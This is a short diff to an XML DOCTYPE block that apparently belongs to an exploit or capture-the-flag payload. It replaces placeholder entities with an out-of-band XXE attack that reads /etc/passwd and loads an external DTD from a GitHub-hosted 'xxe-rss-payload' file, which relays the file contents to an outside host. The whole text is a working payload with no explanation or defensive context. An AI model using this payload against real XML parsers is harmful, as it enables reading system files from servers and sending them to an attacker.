@@ -1,6 +1,6 @@
 <!DOCTYPE updateProfile [
- <!ENTITY % file SYSTEM "file:///path/to/goodies">
- <!ENTITY % dtd SYSTEM "http://evil/send.dtd">
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+ <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/GeorgiyX/xxe-rss-payload/master/send.dtd">
 %dtd;
 %send;
 ]]>
